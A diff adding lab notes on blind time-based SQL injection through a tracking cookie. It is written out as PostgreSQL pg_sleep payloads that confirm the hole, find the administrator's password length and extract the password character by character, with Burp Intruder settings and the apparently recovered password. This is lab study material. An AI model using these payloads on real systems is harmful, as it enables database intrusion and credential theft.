@@ -1,0 +1,51 @@
+Blind SQL injection with time delays and information retrieval - vulnerable parameter tracking cookie
+Goal: Get Administrator password via blind time based sql injection
+
+Analysis:
+
+1) Confirm parameter is vulnerable to SQLi injection
+' || (SELECT pg_sleep(10))-- 
+' || (SELECT pg_sleep(10)) || '
+' || pg_sleep(10)-- 
+
+2) Confirm users table exists
+' || (SELECT CASE WHEN (1=1) then pg_sleep(10) ELSE pg_sleep(-1) END)-- -> True
+' || (SELECT CASE WHEN (1=0) then pg_sleep(10) ELSE pg_sleep(-1) END)-- - False
+
+3) Confirm administrator user exists
+' || (SELECT CASE WHEN (username='administrator') then pg_sleep(10) ELSE pg_sleep(-1) END FROM USERS)--
+
+4) Enumerate Password length
+' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password) > 1) then pg_sleep(10) ELSE pg_sleep(-1) END FROM USERS)--
+-Intruder
+-Mark 1
+TrackingId=L532JKsSJrqyH6Ag'+||+(SELECT+CASE+WHEN+(username%3d'administrator'+AND+LENGTH(password)+>+§1§)+then+pg_sleep(10)+ELSE+pg_sleep(-1)+END+FROM+USERS)--
+-Payloads
+-Numbers
+-From 1 to 25 step 1
+-Resource Pool
+-Create New
+-Max 1 Concurrent Connection
+-20 characters
+
+5) Enumerate the Password
+' || (SELECT CASE WHEN (username='administrator' AND substring(password,1,1)='a') then pg_sleep(5) ELSE pg_sleep(-1) END FROM USERS)--
+-Intruder
+-Mark 1, Mark 'a'
+'+||+(SELECT+CASE+WHEN+(username%3d'administrator'+AND+substring(password,§1§,1)%3d'§a§')+then+pg_sleep(5)+ELSE+pg_sleep(-1)+END+FROM+USERS)--
+-Payloads
+-Payload 1
+-Numbers
+-From 1 to 25 step 1
+-Positions
+-Cluster bomb
+-Payloads
+-Payload 2
+-Brute forcer
+-1 min, 1 max
+
+-Highlited those > 5 seconds
+-Filter to Highlited
+-Sort Payload 1
+
+2jexymzw34leyqdz4vub
